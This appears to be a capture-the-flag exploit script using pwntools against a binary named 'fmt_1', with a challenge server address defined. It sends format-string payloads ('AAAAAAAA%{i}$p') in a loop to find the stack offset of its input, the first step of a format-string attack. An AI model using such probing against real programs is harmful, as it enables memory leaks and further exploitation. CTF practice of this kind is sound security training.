#!/usr/bin/env python3
from pwn import *

exe_path = './fmt_1'
HOST = '103.77.175.40'
PORT = 6101

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

for i in range(1,20):
    p=process(exe.path)
    payload = b'AAAAAAAA' + f'%{i}$p'.encode()
    payload = payload.ljust(512, b'A')
    p.sendafter(b'What do you want to say?', payload)
    output = p.recvuntil(b'You are not a hero.').strip()
    p.close()
    if b'0x4141414141414141' in output:
        log.info(f'offset: {i}')
        p.close()
        break
    p.close()

p.interactive()
